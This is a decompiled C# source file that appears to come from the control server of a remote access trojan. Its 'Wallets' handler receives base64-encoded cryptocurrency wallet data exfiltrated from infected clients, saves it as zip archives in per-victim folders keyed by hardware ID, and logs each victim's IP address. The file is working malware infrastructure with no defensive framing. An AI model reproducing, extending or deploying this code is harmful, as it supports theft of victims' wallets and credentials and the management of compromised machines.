using System;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using Server.Connection;
using Server.MessagePack;

namespace Server.Handle_Packet
{
	// Token: 0x0200007A RID: 122
	public class Wallets
	{
		// Token: 0x06000316 RID: 790 RVA: 0x0002250C File Offset: 0x0002070C
		public Wallets(Clients client, MsgPack unpack_msgpack)
		{
			try
			{
				string text = Path.Combine(Application.StartupPath, "ClientsFolder", unpack_msgpack.ForcePathObject("Hwid").AsString, "Wallets");
				string asString = unpack_msgpack.ForcePathObject("Data").AsString;
				if (!string.IsNullOrWhiteSpace(asString))
				{
					if (!Directory.Exists(text))
					{
						Directory.CreateDirectory(text);
					}
					File.WriteAllBytes(text + "\\Wallets_" + DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss") + ".zip", Convert.FromBase64String(asString));
					new HandleLogs().Addmsg(string.Concat(new string[]
					{
						"Client ",
						client.Ip,
						" Wallets was saved successfully @ ClientsFolder \\ ",
						unpack_msgpack.ForcePathObject("Hwid").AsString,
						" \\ Wallets"
					}), Color.Purple);
				}
				else
				{
					new HandleLogs().Addmsg("Client " + client.Ip + " has no Wallets", Color.MediumPurple);
				}
			}
			catch (Exception ex)
			{
				new HandleLogs().Addmsg(ex.Message, Color.Red);
			}
		}
	}
}
